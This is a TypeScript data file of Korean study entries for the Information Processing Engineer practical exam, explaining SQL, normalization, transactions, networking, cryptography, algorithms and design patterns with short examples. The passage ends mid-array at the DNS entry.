/**
 * 정보처리기사 실기 시험 키워드 설명 데이터
 * 
 * - keyword: 키워드 이름
 * - description: 키워드에 대한 상세 설명
 * - example: 예시 코드 또는 설명 (선택 사항)
 * - relatedKeywords: 관련 키워드 목록 (선택 사항)
 */

// 키워드 설명 인터페이스 정의
export interface KeywordDescription {
  keyword: string;
  description: string;
  example?: string;
  relatedKeywords?: string[];
}

export const KEYWORD_DESCRIPTIONS: KeywordDescription[] = [
  {
    keyword: 'DDL',
    description: 'DDL(Data Definition Language)은 데이터베이스 스키마를 정의하고 수정하기 위한 SQL 명령어 집합입니다. 테이블, 인덱스, 뷰와 같은 데이터베이스 객체를 생성, 변경, 삭제하는 데 사용됩니다.',
    example: 'CREATE TABLE employee (\n  id INT PRIMARY KEY,\n  name VARCHAR(50),\n  department VARCHAR(30)\n);\n\nALTER TABLE employee ADD COLUMN salary INT;\n\nDROP TABLE employee;',
    relatedKeywords: ['SQL', 'CREATE', 'ALTER', 'DROP', 'DML', 'DCL']
  },
  {
    keyword: 'DML',
    description: 'DML(Data Manipulation Language)은 데이터베이스 내의 데이터를 조작하기 위한 SQL 명령어 집합입니다. 데이터 조회, 삽입, 수정, 삭제 등의 작업을 수행합니다.',
    example: 'SELECT * FROM employee WHERE department = \'IT\';\n\nINSERT INTO employee (id, name, department) VALUES (1, \'홍길동\', \'개발\');\n\nUPDATE employee SET salary = 5000 WHERE id = 1;\n\nDELETE FROM employee WHERE id = 1;',
    relatedKeywords: ['SQL', 'SELECT', 'INSERT', 'UPDATE', 'DELETE', 'DDL']
  },
  {
    keyword: 'DCL',
    description: 'DCL(Data Control Language)은 데이터베이스 접근 권한을 제어하기 위한 SQL 명령어 집합입니다. 사용자에게 특정 데이터베이스나 테이블에 대한 권한을 부여하거나 취소하는 데 사용됩니다.',
    example: 'GRANT SELECT, INSERT ON employee TO user1;\n\nREVOKE DELETE ON employee FROM user1;',
    relatedKeywords: ['SQL', 'GRANT', 'REVOKE', 'DDL', 'DML']
  },
  {
    keyword: 'SQL',
    description: 'SQL(Structured Query Language)은 관계형 데이터베이스 관리 시스템(RDBMS)의 데이터를 관리하기 위해 설계된 특수 목적의 프로그래밍 언어입니다. 데이터 쿼리, 데이터 조작, 데이터 정의, 접근 제어 등을 위한 다양한 명령어를 제공합니다.',
    example: '-- 데이터 조회\nSELECT * FROM products WHERE price > 1000;\n\n-- 데이터 삽입\nINSERT INTO customers (name, email) VALUES (\'김철수\', \'kim@example.com\');\n\n-- 테이블 생성\nCREATE TABLE orders (\n  id INT PRIMARY KEY,\n  customer_id INT,\n  order_date DATE\n);',
    relatedKeywords: ['DDL', 'DML', 'DCL', 'RDBMS', '정규화', '트랜잭션']
  },
  {
    keyword: '정규화',
    description: '정규화(Normalization)는 데이터베이스 설계 시 중복을 최소화하고 데이터 무결성을 보장하기 위해 관계형 데이터베이스의 테이블을 구조화하는 프로세스입니다. 1NF, 2NF, 3NF, BCNF, 4NF, 5NF 등 여러 단계로 구성됩니다.',
    example: '1NF: 각 컬럼이 원자값을 가짐\n2NF: 1NF + 부분 종속성 제거\n3NF: 2NF + 이행적 종속성 제거\nBCNF: 3NF + 모든 결정자가 후보키인 경우',
    relatedKeywords: ['데이터베이스', '테이블', 'ERD', '반정규화', '무결성']
  },
  {
    keyword: '반정규화',
    description: '반정규화(Denormalization)는 정규화된 데이터베이스 구조를 의도적으로 중복시키거나 그룹화하여 쿼리 성능을 향상시키는 기법입니다. 읽기 작업이 많고 성능이 중요한 시스템에서 자주 사용됩니다.',
    example: '- 테이블 병합: 1:1 또는 1:N 관계의 테이블을 하나로 통합\n- 컬럼 복제: 자주 조인되는 테이블의 컬럼을 다른 테이블에 복제\n- 테이블 분할: 수직 또는 수평으로 테이블을 분할',
    relatedKeywords: ['정규화', '성능 최적화', '인덱싱', '데이터 중복']
  },
  {
    keyword: '트랜잭션',
    description: '트랜잭션(Transaction)은 데이터베이스의 상태를 변환시키는 하나의 논리적 작업 단위입니다. 트랜잭션은 ACID 속성(원자성, 일관성, 고립성, 지속성)을 가지며, 이를 통해 데이터 무결성을 보장합니다.',
    example: 'BEGIN TRANSACTION;\n\nUPDATE accounts SET balance = balance - 1000 WHERE account_id = 123;\nUPDATE accounts SET balance = balance + 1000 WHERE account_id = 456;\n\nCOMMIT; -- 성공 시\n-- 또는\nROLLBACK; -- 실패 시',
    relatedKeywords: ['ACID', '커밋', '롤백', '격리 수준', '동시성 제어']
  },
  {
    keyword: '인덱스',
    description: '인덱스(Index)는 데이터베이스 테이블의 검색 속도를 향상시키기 위한 자료구조입니다. 데이터 조회 성능을 개선하지만, 데이터 변경 작업(삽입, 수정, 삭제)의 성능은 감소시킬 수 있습니다.',
    example: '-- 인덱스 생성\nCREATE INDEX idx_employee_name ON employee(name);\n\n-- 복합 인덱스 생성\nCREATE INDEX idx_employee_dept_name ON employee(department, name);\n\n-- 인덱스 삭제\nDROP INDEX idx_employee_name;',
    relatedKeywords: ['B-Tree', '해시 인덱스', '클러스터 인덱스', '성능 최적화', '쿼리 튜닝']
  },
  {
    keyword: 'UML',
    description: 'UML(Unified Modeling Language)은 소프트웨어 시스템의 설계와 구조를 시각화하고 문서화하기 위한 표준화된 모델링 언어입니다. 다양한 다이어그램을 통해 시스템의 다양한 측면을 표현합니다.',
    example: 'UML 다이어그램 유형:\n- 클래스 다이어그램: 클래스, 속성, 메서드, 관계 표현\n- 시퀀스 다이어그램: 객체 간 메시지 교환 순서 표현\n- 유스케이스 다이어그램: 시스템과 사용자 간 상호작용 표현\n- 상태 다이어그램: 객체의 상태 변화 표현',
    relatedKeywords: ['클래스 다이어그램', '시퀀스 다이어그램', '유스케이스', '객체지향 설계', 'ER 다이어그램']
  },
  {
    keyword: 'ACID',
    description: 'ACID는 데이터베이스 트랜잭션이 안전하게 수행된다는 것을 보장하기 위한 4가지 속성입니다. Atomicity(원자성), Consistency(일관성), Isolation(격리성), Durability(지속성)의 약자입니다.',
    example: '- 원자성: 트랜잭션의 모든 연산이 완료되거나 아무것도 수행되지 않음\n- 일관성: 트랜잭션 수행 전후에 데이터베이스가 일관된 상태를 유지\n- 격리성: 동시에 실행되는 트랜잭션들이 서로 영향을 미치지 않음\n- 지속성: 성공적으로 완료된 트랜잭션의 결과는 영구적으로 반영됨',
    relatedKeywords: ['트랜잭션', '격리 수준', '데이터 무결성', '커밋', '롤백']
  },
  {
    keyword: 'TCP/IP',
    description: 'TCP/IP는 인터넷에서 컴퓨터들이 서로 통신하기 위해 사용하는 프로토콜의 집합입니다. TCP(전송 제어 프로토콜)는 데이터의 신뢰성을 보장하고, IP(인터넷 프로토콜)는 데이터 패킷의 라우팅을 담당합니다.',
    example: '- TCP 3-way 핸드셰이크:\n  1. SYN: 클라이언트가 서버에 연결 요청\n  2. SYN-ACK: 서버가 클라이언트에 요청 수락과 연결 요청\n  3. ACK: 클라이언트가 서버에 응답 전송, 연결 설정\n\n- IP 주소 형식: IPv4 (예: 192.168.0.1), IPv6 (예: 2001:0db8:85a3:0000:0000:8a2e:0370:7334)',
    relatedKeywords: ['OSI 7계층', 'UDP', 'HTTP', '라우팅', '포트', '소켓']
  },
  {
    keyword: 'OSI 7계층',
    description: 'OSI 7계층(OSI 7 Layer Model)은 네트워크 통신을 7개의 계층으로 나누어 표준화한 모델입니다. 각 계층은 특정 네트워크 기능을 담당하며, 계층 간에는 정해진 인터페이스를 통해 통신합니다.',
    example: '1. 물리 계층(Physical Layer): 비트 전송, 케이블, 허브\n2. 데이터 링크 계층(Data Link Layer): MAC 주소, 스위치, 이더넷\n3. 네트워크 계층(Network Layer): IP, 라우터, 패킷 라우팅\n4. 전송 계층(Transport Layer): TCP, UDP, 포트, 세그먼트\n5. 세션 계층(Session Layer): 세션 연결 관리\n6. 표현 계층(Presentation Layer): 데이터 변환, 암호화\n7. 응용 계층(Application Layer): HTTP, FTP, DNS, SMTP',
    relatedKeywords: ['TCP/IP', '네트워크 프로토콜', '인터넷', '라우팅', '프로토콜 스택']
  },
  {
    keyword: '대칭키 암호화',
    description: '대칭키 암호화(Symmetric-key Encryption)는 동일한 키를 사용하여 암호화와 복호화를 수행하는 암호화 방식입니다. 빠른 속도가 장점이지만, 안전한 키 교환이 어렵다는 단점이 있습니다.',
    example: '- 대표적인 알고리즘: AES, DES, 3DES, SEED\n- 사용 사례: 파일 암호화, 대용량 데이터 암호화, SSL/TLS의 데이터 암호화 부분\n- 키 길이: AES-128, AES-192, AES-256 등',
    relatedKeywords: ['비대칭키 암호화', 'AES', '암호화 키', '블록 암호', '스트림 암호']
  },
  {
    keyword: '비대칭키 암호화',
    description: '비대칭키 암호화(Asymmetric Encryption)는 공개키와 개인키 한 쌍을 사용하는 암호화 방식입니다. 공개키로 암호화된 데이터는 개인키로만 복호화할 수 있어 안전한 통신이 가능합니다.',
    example: '- 대표적인 알고리즘: RSA, ECC, DSA\n- 사용 사례: 전자서명, SSL/TLS 인증서, 키 교환\n- RSA 키 생성 과정:\n  1. 두 개의 큰 소수 p, q 선택\n  2. n = p × q 계산\n  3. φ(n) = (p-1) × (q-1) 계산\n  4. 공개키 e와 개인키 d 생성',
    relatedKeywords: ['RSA', '공개키', '개인키', '전자서명', 'PKI', '인증서']
  },
  {
    keyword: '해시함수',
    description: '해시함수(Hash Function)는 임의의 길이의 데이터를 고정된 길이의 데이터(해시값)로 변환하는 함수입니다. 원본 데이터를 복원할 수 없는 일방향성이 특징이며, 데이터 무결성 검증과 비밀번호 저장에 활용됩니다.',
    example: '- 대표적인 알고리즘: MD5, SHA-1, SHA-256, SHA-3, bcrypt\n- 사용 사례: 비밀번호 저장, 데이터 무결성 검증, 블록체인\n- 특성: 일방향성, 충돌 저항성\n- 해시값 예시(SHA-256): "hello" → "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"',
    relatedKeywords: ['무결성', '일방향성', '충돌', 'SHA', 'MD5', '솔트']
  },
  {
    keyword: '정렬 알고리즘',
    description: '정렬 알고리즘은 원소들을 특정 순서(오름차순, 내림차순 등)에 따라 배열하는 알고리즘입니다. 알고리즘마다 시간복잡도, 공간복잡도, 안정성 등의 특성이 다릅니다.',
    example: '1. 버블 정렬(Bubble Sort): O(n²), 인접한 두 원소 비교 및 교환\n2. 선택 정렬(Selection Sort): O(n²), 최소값 선택하여 배치\n3. 삽입 정렬(Insertion Sort): O(n²), 적절한 위치에 원소 삽입\n4. 퀵 정렬(Quick Sort): 평균 O(n log n), 분할 정복 방식\n5. 병합 정렬(Merge Sort): O(n log n), 안정적, 분할 정복 방식\n6. 힙 정렬(Heap Sort): O(n log n), 힙 자료구조 사용',
    relatedKeywords: ['알고리즘', '퀵 정렬', '병합 정렬', '버블 정렬', '시간복잡도', '공간복잡도']
  },
  {
    keyword: '그래프 알고리즘',
    description: '그래프 알고리즘은 노드(정점)와 엣지(간선)로 구성된 그래프 구조에서 다양한 문제를 해결하는 알고리즘입니다. 경로 탐색, 최소 비용 산출, 네트워크 분석 등에 활용됩니다.',
    example: '1. 깊이 우선 탐색(DFS): 스택 또는 재귀를 사용해 깊이 방향으로 탐색\n2. 너비 우선 탐색(BFS): 큐를 사용해 넓이 방향으로 탐색\n3. 다익스트라 알고리즘: 단일 출발점 최단 경로 문제\n4. 벨만-포드 알고리즘: 음의 가중치가 있는 그래프의 최단 경로\n5. 프림 알고리즘: 최소 신장 트리 구성\n6. 크루스칼 알고리즘: 최소 신장 트리 구성(유니온-파인드 활용)',
    relatedKeywords: ['DFS', 'BFS', '최단경로', '최소신장트리', '위상정렬', '강한 연결 요소']
  },
  {
    keyword: '동적 프로그래밍',
    description: '동적 프로그래밍(Dynamic Programming)은 복잡한 문제를 간단한 하위 문제로 나누어 해결하는 알고리즘 설계 기법입니다. 중복되는 계산을 저장하여 재활용함으로써 실행 속도를 향상시킵니다.',
    example: '- 피보나치 수열 계산(메모이제이션 방식):\nfunction fib(n, memo = {}):\n  if n in memo: return memo[n]\n  if n <= 2: return 1\n  memo[n] = fib(n-1, memo) + fib(n-2, memo)\n  return memo[n]\n\n- 대표적인 DP 문제: 최장 공통 부분 수열(LCS), 배낭 문제, 편집 거리',
    relatedKeywords: ['메모이제이션', '타뷸레이션', '최적 부분 구조', '중복 부분 문제', '그리디 알고리즘']
  },
  {
    keyword: '소프트웨어 개발 생명주기',
    description: '소프트웨어 개발 생명주기(SDLC, Software Development Life Cycle)는 소프트웨어 개발 과정을 체계적으로 구성한 프레임워크입니다. 계획에서 유지보수까지 소프트웨어의 전체 생명주기를 관리합니다.',
    example: '1. 계획(Planning): 프로젝트 범위, 일정, 비용 등 계획 수립\n2. 요구사항 분석(Requirements): 시스템 요구사항 정의 및 문서화\n3. 설계(Design): 아키텍처 설계, 상세 설계 등 시스템 구조 설계\n4. 구현(Implementation): 설계 기반 코드 작성 및 단위 테스트\n5. 테스트(Testing): 통합 테스트, 시스템 테스트, 사용자 인수 테스트\n6. 배포(Deployment): 사용자 환경에 시스템 설치 및 배포\n7. 유지보수(Maintenance): 오류 수정, 기능 개선, 환경 적응 등',
    relatedKeywords: ['폭포수 모델', '애자일', '스크럼', '데브옵스', '프로토타입', '스파이럴 모델']
  },
  {
    keyword: '디자인 패턴',
    description: '디자인 패턴은 소프트웨어 설계 시 자주 발생하는 문제에 대한 재사용 가능한 해결책입니다. 코드의 유지보수성과 확장성을 높이며, 개발자 간 의사소통을 효율적으로 만들어 줍니다.',
    example: '1. 생성 패턴: 객체 생성 메커니즘 다루기\n   - 싱글턴(Singleton): 클래스의 인스턴스가 하나만 생성되도록 보장\n   - 팩토리 메서드(Factory Method): 객체 생성을 서브클래스에 위임\n   - 추상 팩토리(Abstract Factory): 관련 객체들의 집합 생성\n\n2. 구조 패턴: 클래스와 객체 합성\n   - 어댑터(Adapter): 인터페이스 변환하여 호환성 제공\n   - 데코레이터(Decorator): 객체에 동적으로 책임 추가\n\n3. 행위 패턴: 객체 간 상호작용과 책임 분배\n   - 옵저버(Observer): 객체 간 일대다 의존성 정의\n   - 전략(Strategy): 알고리즘군을 정의하고 교체 가능하게 함',
    relatedKeywords: ['GoF', '싱글턴', '팩토리', '옵저버', 'MVC', '의존성 주입']
  },
  {
    keyword: 'TCL',
    description: 'TCL(Transaction Control Language)은 데이터베이스 트랜잭션을 관리하기 위한 SQL 명령어 집합입니다. 트랜잭션의 시작, 완료, 취소, 저장점 생성 등을 제어합니다.',
    example: 'BEGIN TRANSACTION; -- 트랜잭션 시작\n\n-- 데이터 조작 쿼리들...\n\nCOMMIT; -- 트랜잭션 완료\n\n-- 또는\nROLLBACK; -- 트랜잭션 취소\n\nSAVEPOINT save1; -- 저장점 생성\nROLLBACK TO save1; -- 특정 저장점으로 롤백',
    relatedKeywords: ['트랜잭션', 'COMMIT', 'ROLLBACK', 'SAVEPOINT', 'ACID']
  },
  {
    keyword: '이상현상',
    description: '이상현상(Anomaly)은 데이터베이스 설계가 잘못되었을 때 발생하는 데이터 불일치 현상입니다. 주로 삽입 이상, 삭제 이상, 갱신 이상으로 구분되며, 정규화를 통해 이를 해결합니다.',
    example: '1. 삽입 이상(Insertion Anomaly): 특정 데이터를 삽입하기 위해 불필요한 데이터도 함께 삽입해야 하는 문제\n2. 삭제 이상(Deletion Anomaly): 특정 데이터를 삭제할 때 의도치 않게 필요한 데이터까지 함께 삭제되는 문제\n3. 갱신 이상(Update Anomaly): 중복된 데이터 중 일부만 갱신하여 데이터 불일치가 발생하는 문제',
    relatedKeywords: ['정규화', '데이터 무결성', '함수적 종속성', '중복 데이터']
  },
  {
    keyword: '무결성',
    description: '데이터베이스 무결성(Integrity)은 데이터의 정확성, 일관성, 유효성을 유지하기 위한 제약조건입니다. 개체 무결성, 참조 무결성, 도메인 무결성, 사용자 정의 무결성으로 분류됩니다.',
    example: '1. 개체 무결성(Entity Integrity): 기본키는 NULL 값이나 중복값을 가질 수 없음\n2. 참조 무결성(Referential Integrity): 외래키는 참조하는 테이블의 기본키에 존재하는 값만 가질 수 있음\n3. 도메인 무결성(Domain Integrity): 각 컬럼의 값은 정의된 도메인(타입, 형식, 범위)을 따라야 함\n4. 사용자 정의 무결성(User-Defined Integrity): 업무 규칙이나 제약조건에 따른 무결성',
    relatedKeywords: ['데이터 일관성', '제약조건', '기본키', '외래키', '도메인']
  },
  {
    keyword: '트리거',
    description: '트리거(Trigger)는 데이터베이스에서 특정 이벤트(INSERT, UPDATE, DELETE)가 발생할 때 자동으로 실행되는 프로시저입니다. 데이터 무결성 유지, 감사 로깅, 업무 규칙 자동화 등에 활용됩니다.',
    example: 'CREATE TRIGGER update_modified_date\nBEFORE UPDATE ON employees\nFOR EACH ROW\nBEGIN\n    SET NEW.modified_date = CURRENT_TIMESTAMP;\nEND;',
    relatedKeywords: ['저장 프로시저', '이벤트', '데이터 무결성', '자동화', 'PL/SQL']
  },
  {
    keyword: '스토어드 프로시저',
    description: '스토어드 프로시저(Stored Procedure)는 데이터베이스에 저장되어 실행되는 SQL 문의 집합입니다. 매개변수를 받고 결과를 반환할 수 있으며, 데이터베이스 내에서 복잡한 처리를 수행합니다.',
    example: 'CREATE PROCEDURE GetEmployeesByDepartment(\n    IN deptName VARCHAR(50),\n    OUT employeeCount INT\n)\nBEGIN\n    SELECT COUNT(*) INTO employeeCount\n    FROM employees\n    WHERE department = deptName;\n    \n    SELECT * FROM employees\n    WHERE department = deptName;\nEND;',
    relatedKeywords: ['PL/SQL', '함수', '트리거', '데이터베이스 프로그래밍', '성능 최적화']
  },
  {
    keyword: '커서',
    description: '커서(Cursor)는 데이터베이스에서 여러 행의 결과셋을 한 번에 한 행씩 처리하기 위한 데이터베이스 객체입니다. 주로 저장 프로시저나 트리거 내에서 반복적인 데이터 처리에 사용됩니다.',
    example: 'DECLARE\n    CURSOR employee_cursor IS\n    SELECT employee_id, name FROM employees\n    WHERE department = \'IT\';\n    \n    emp_id employees.employee_id%TYPE;\n    emp_name employees.name%TYPE;\nBEGIN\n    OPEN employee_cursor;\n    LOOP\n        FETCH employee_cursor INTO emp_id, emp_name;\n        EXIT WHEN employee_cursor%NOTFOUND;\n        -- 처리 로직...\n    END LOOP;\n    CLOSE employee_cursor;\nEND;',
    relatedKeywords: ['저장 프로시저', '반복 처리', '결과셋', 'PL/SQL', '명시적 커서', '암시적 커서']
  },
  {
    keyword: '조인(INNER/OUTER/CROSS)',
    description: '조인(Join)은 두 개 이상의 테이블에서 관련된 행들을 결합하는 SQL 연산입니다. INNER JOIN, LEFT/RIGHT/FULL OUTER JOIN, CROSS JOIN 등 다양한 유형이 있으며, 테이블 간 관계에 따라 적절한 조인을 선택해야 합니다.',
    example: '-- INNER JOIN: 두 테이블에서 일치하는 행만 반환\nSELECT e.name, d.dept_name\nFROM employees e\nINNER JOIN departments d ON e.dept_id = d.id;\n\n-- LEFT OUTER JOIN: 왼쪽 테이블의 모든 행과 오른쪽 테이블의 일치하는 행 반환\nSELECT e.name, d.dept_name\nFROM employees e\nLEFT JOIN departments d ON e.dept_id = d.id;\n\n-- CROSS JOIN: 두 테이블의 모든 가능한 조합 반환 (카티션 곱)\nSELECT e.name, d.dept_name\nFROM employees e\nCROSS JOIN departments d;',
    relatedKeywords: ['SQL', '테이블 관계', 'INNER JOIN', 'OUTER JOIN', 'CROSS JOIN', '카티션 곱']
  },
  {
    keyword: '서브쿼리',
    description: '서브쿼리(Subquery)는 다른 SQL 쿼리 내에 중첩된 SELECT 문입니다. 단일 행, 다중 행, 다중 컬럼 서브쿼리로 구분되며, WHERE, FROM, SELECT 절 등 다양한 위치에서 사용할 수 있습니다.',
    example: '-- WHERE 절 서브쿼리\nSELECT name\nFROM employees\nWHERE salary > (SELECT AVG(salary) FROM employees);\n\n-- FROM 절 서브쿼리 (인라인 뷰)\nSELECT d.dept_name, e_count\nFROM departments d,\n     (SELECT dept_id, COUNT(*) as e_count FROM employees GROUP BY dept_id) e\nWHERE d.id = e.dept_id;\n\n-- SELECT 절 서브쿼리 (스칼라 서브쿼리)\nSELECT e.name,\n       (SELECT dept_name FROM departments WHERE id = e.dept_id) as dept_name\nFROM employees e;',
    relatedKeywords: ['SQL', '중첩 쿼리', '인라인 뷰', '스칼라 서브쿼리', '상관 서브쿼리']
  },
  {
    keyword: 'ERD',
    description: 'ERD(Entity-Relationship Diagram)는 데이터베이스의 구조를 시각적으로 표현하는 다이어그램입니다. 엔티티(개체), 관계, 속성을 표시하여 데이터베이스의 논리적 구조를 모델링합니다.',
    example: 'ERD 구성 요소:\n1. 엔티티(Entity): 사각형으로 표현, 데이터를 저장하는 개체(예: 학생, 강의)\n2. 관계(Relationship): 마름모로 표현, 엔티티 간의 연관성(예: 수강, 담당)\n3. 속성(Attribute): 타원으로 표현, 엔티티의 특성(예: 학번, 이름, 학과)\n4. 카디널리티(Cardinality): 1:1, 1:N, N:M 등 관계의 참여 수 표시',
    relatedKeywords: ['데이터 모델링', '엔티티', '관계', '속성', '정규화', 'E-R 다이어그램']
  },
  {
    keyword: '뷰',
    description: '뷰(View)는 하나 이상의 테이블에서 파생된 가상 테이블입니다. 실제 데이터를 저장하지 않고 SQL 쿼리를 기반으로 동적으로 데이터를 표시합니다. 데이터 접근 제어, 복잡한 쿼리 단순화, 데이터 독립성 향상에 활용됩니다.',
    example: '-- 뷰 생성\nCREATE VIEW employee_dept_view AS\nSELECT e.name, e.employee_id, d.dept_name\nFROM employees e\nJOIN departments d ON e.dept_id = d.id;\n\n-- 뷰 사용\nSELECT * FROM employee_dept_view\nWHERE dept_name = \'개발팀\';',
    relatedKeywords: ['가상 테이블', '데이터 접근 제어', '쿼리 단순화', '데이터 독립성']
  },
  {
    keyword: '정규형(1NF/2NF/3NF/BCNF)',
    description: '정규형(Normal Form)은 데이터베이스 설계에서 중복과 이상현상을 방지하기 위한 테이블 구조의 단계적 조건입니다. 제1정규형(1NF)부터 시작하여 보이스-코드 정규형(BCNF), 제4,5정규형까지 단계별로 구조가 개선됩니다.',
    example: '- 제1정규형(1NF): 모든 속성이 원자값을 가짐\n- 제2정규형(2NF): 1NF + 부분 종속성 제거\n- 제3정규형(3NF): 2NF + 이행적 종속성 제거\n- BCNF(Boyce-Codd Normal Form): 모든 결정자가 후보키인 경우',
    relatedKeywords: ['정규화', '함수적 종속성', '이상현상', '후보키', '부분 함수적 종속', '이행적 함수적 종속']
  },
  {
    keyword: '관계대수',
    description: '관계대수(Relational Algebra)는 관계형 데이터베이스에서 원하는 정보를 어떻게 찾아낼 것인가를 표현하는 절차적 언어입니다. 기본적인 연산자로는 선택(Selection), 투영(Projection), 합집합(Union), 차집합(Difference), 교집합(Intersection), 카티션 곱(Cartesian Product), 조인(Join) 등이 있습니다.',
    example: '1. 선택(σ): σ조건(R) - 릴레이션 R에서 조건을 만족하는 튜플 선택\n2. 투영(π): π속성리스트(R) - 릴레이션 R에서 지정된 속성만 추출\n3. 합집합(∪): R ∪ S - R과 S의 합집합 연산\n4. 차집합(-): R - S - R에서 S를 뺀 차집합 연산\n5. 카티션 곱(×): R × S - R과 S의 모든 튜플 조합\n6. 조인(⋈): R ⋈조건 S - 조건에 따라 R과 S를 연결',
    relatedKeywords: ['SQL', '선택 연산', '투영 연산', '조인 연산', '관계형 데이터베이스', '질의어']
  },
  {
    keyword: '테이블 파티셔닝',
    description: '테이블 파티셔닝(Table Partitioning)은 대용량 테이블을 여러 개의 물리적 파티션으로 분할하는 기법입니다. 데이터 접근 성능을 향상시키고, 관리를 용이하게 하며, 가용성을 높이는 데 기여합니다.',
    example: '파티셔닝 유형:\n1. 범위 파티셔닝(Range Partitioning): 값의 범위에 따라 분할 (예: 날짜별, 월별)\n2. 목록 파티셔닝(List Partitioning): 특정 값 목록에 따라 분할 (예: 지역별)\n3. 해시 파티셔닝(Hash Partitioning): 해시 함수를 사용하여 균등 분할\n4. 복합 파티셔닝(Composite Partitioning): 여러 파티셔닝 방식 조합\n\nCREATE TABLE sales (\n  sale_id INT,\n  sale_date DATE,\n  amount DECIMAL(10,2)\n)\nPARTITION BY RANGE (YEAR(sale_date)) (\n  PARTITION p0 VALUES LESS THAN (2020),\n  PARTITION p1 VALUES LESS THAN (2021),\n  PARTITION p2 VALUES LESS THAN (2022),\n  PARTITION p3 VALUES LESS THAN MAXVALUE\n);',
    relatedKeywords: ['분할', '샤딩', '성능 최적화', '대용량 데이터', '범위 파티셔닝', '해시 파티셔닝']
  },
  {
    keyword: 'ORM',
    description: 'ORM(Object-Relational Mapping)은 객체지향 프로그래밍의 객체와 관계형 데이터베이스의 테이블을 매핑해주는 기술입니다. 개발자가 SQL 쿼리를 직접 작성하지 않고 객체를 통해 데이터베이스를 조작할 수 있게 해줍니다.',
    example: '// Java Hibernate/JPA 예시\n@Entity\n@Table(name = "employees")\npublic class Employee {\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n    \n    @Column(name = "name")\n    private String name;\n    \n    @ManyToOne\n    @JoinColumn(name = "department_id")\n    private Department department;\n    \n    // getter, setter 메서드...\n}\n\n// 사용 예시\nEmployee employee = new Employee();\nemployee.setName("홍길동");\nemployee.setDepartment(departmentObj);\nsession.save(employee); // 데이터베이스에 저장',
    relatedKeywords: ['JPA', 'Hibernate', 'MyBatis', 'Entity', '객체-관계 매핑', '영속성']
  },
  {
    keyword: 'NoSQL',
    description: 'NoSQL(Not Only SQL)은 전통적인 관계형 데이터베이스(RDBMS)가 아닌 다른 형태의 데이터 저장 및 검색 메커니즘을 제공하는 데이터베이스입니다. 대량의 분산된 데이터를 저장하고 처리하는 데 적합하며, 스키마가 유연하거나 없는 경우가 많습니다.',
    example: 'NoSQL 데이터베이스 유형:\n1. 문서 지향(Document-Oriented): MongoDB, CouchDB\n   - JSON 형태의 문서로 데이터 저장\n   - {name: "홍길동", skills: ["Java", "Python"], department: {id: 1, name: "개발"}}\n\n2. 키-값(Key-Value): Redis, DynamoDB\n   - 간단한 키-값 쌍으로 데이터 저장\n   - SET user:1001 "홍길동"\n\n3. 컬럼 지향(Column-Family): Cassandra, HBase\n   - 컬럼 패밀리로 데이터 구성\n\n4. 그래프(Graph): Neo4j, JanusGraph\n   - 노드와 관계로 연결된 구조 저장',
    relatedKeywords: ['빅데이터', '분산 데이터베이스', '문서 지향', '키-값 저장소', '스키마리스', '수평적 확장성', 'CAP 이론']
  },
  {
    keyword: '외래키',
    description: '외래키(Foreign Key)는 한 테이블의 필드(또는 필드 조합)가 다른 테이블의 기본키를 참조하는 제약조건입니다. 테이블 간의 관계를 정의하고, 참조 무결성을 유지하는 데 중요한 역할을 합니다.',
    example: 'CREATE TABLE departments (\n  dept_id INT PRIMARY KEY,\n  dept_name VARCHAR(50)\n);\n\nCREATE TABLE employees (\n  emp_id INT PRIMARY KEY,\n  name VARCHAR(100),\n  dept_id INT,\n  FOREIGN KEY (dept_id) REFERENCES departments(dept_id)\n);',
    relatedKeywords: ['참조 무결성', '기본키', '관계', '제약조건', 'CASCADE', 'ON DELETE', 'ON UPDATE']
  },
  {
    keyword: '후보키',
    description: '후보키(Candidate Key)는 테이블의 각 행을 고유하게 식별할 수 있는 최소한의 속성 집합입니다. 중복값이 없고(유일성), 최소한의 속성으로 구성되어 있어(최소성) 기본키가 될 수 있는 후보 속성 집합입니다.',
    example: '학생 테이블의 후보키 예시:\n- 학번: 각 학생을 고유하게 식별할 수 있음\n- 주민등록번호: 각 학생을 고유하게 식별할 수 있음\n\n이 중 하나(일반적으로 학번)가 기본키로 선택되고, 나머지(주민등록번호)는 대체키가 됩니다.',
    relatedKeywords: ['기본키', '대체키', '슈퍼키', '유일성', '최소성', '식별자']
  },
  {
    keyword: '기본키',
    description: '기본키(Primary Key)는 테이블에서 각 행을 고유하게 식별하기 위해 선택된 후보키입니다. NULL 값을 가질 수 없으며, 중복된 값도 허용되지 않습니다. 테이블당 하나만 정의할 수 있으며, 인덱스가 자동으로 생성됩니다.',
    example: 'CREATE TABLE students (\n  student_id INT PRIMARY KEY, -- 기본키 정의\n  name VARCHAR(100) NOT NULL,\n  email VARCHAR(100) UNIQUE,\n  major VARCHAR(50)\n);',
    relatedKeywords: ['후보키', '유일성', '개체 무결성', '인덱스', '식별자', 'NOT NULL', 'UNIQUE']
  },
  {
    keyword: 'HTTP/HTTPS',
    description: 'HTTP(Hypertext Transfer Protocol)는 웹에서 클라이언트와 서버 간 통신을 위한 프로토콜입니다. HTTPS(HTTP Secure)는 HTTP에 SSL/TLS 암호화를 추가하여 보안을 강화한 버전입니다.',
    example: 'HTTP 요청/응답 구조:\n1. 요청 메서드: GET, POST, PUT, DELETE 등\n2. 요청 헤더: Content-Type, User-Agent, Authorization 등\n3. 요청 본문: 데이터 (POST, PUT 요청 시)\n\n응답 구조:\n1. 상태 코드: 200(OK), 404(Not Found), 500(Server Error) 등\n2. 응답 헤더: Content-Type, Content-Length 등\n3. 응답 본문: 요청된 리소스\n\nHTTPS = HTTP + SSL/TLS(데이터 암호화)',
    relatedKeywords: ['웹 프로토콜', 'REST API', 'HTTP 메서드', 'HTTP 상태코드', 'SSL/TLS', '웹 보안']
  },
  {
    keyword: 'DNS',
    description: 'DNS(Domain Name System)는 사람이 읽을 수 있는 도메인 이름(예: example.com)을 컴퓨터가 이해할 수 있는 IP 주소(예: 192.168.0.1)로 변환하는 시스템입니다. 인터넷의 "전화번호부" 역할을 합니다.',
